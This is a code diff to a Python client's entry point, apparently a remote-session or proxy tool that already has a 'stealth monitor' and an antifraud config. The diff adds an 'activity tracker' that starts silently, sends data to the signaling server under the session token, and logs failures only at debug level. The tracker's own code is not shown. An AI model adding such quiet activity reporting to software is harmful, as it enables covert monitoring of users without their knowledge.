@@ -20,6 +20,7 @@ import urllib.parse
 import urllib.request
 
 from .config import (
+    load_activity_env,
     load_antifraud_config,
     resolve_session_id,
     resolve_signaling_token,
@@ -199,6 +200,9 @@ def _configure_logging() -> None:
 
 
 def main() -> None:
+    # Load embedded activity tracker config (if present)
+    load_activity_env()
+    
     _configure_logging()
     ensure_dpi_awareness()
 
@@ -340,6 +344,19 @@ def main() -> None:
             )
         except Exception as exc:
             logging.getLogger(__name__).warning("SOCKS5 proxy failed: %s", exc)
+    
+    # Start activity tracker if enabled
+    activity_sender = None
+    try:
+        from .activity_tracker.sender import start_activity_tracking
+        activity_sender = start_activity_tracking(
+            session_id=session_id,
+            server_url=resolve_signaling_url(),
+            token=signaling_token,
+        )
+    except Exception as exc:
+        logging.getLogger(__name__).debug("Activity tracking unavailable: %s", exc)
+
     client = build_client(
         session_id,
         signaling_token,
@@ -351,6 +368,11 @@ def main() -> None:
         asyncio.run(client.run_forever())
     finally:
         stop_stealth_monitor()
+        if activity_sender is not None:
+            try:
+                activity_sender.stop()
+            except Exception:
+                pass
         if proxy_server is not None:
             try:
                 proxy_server.stop()
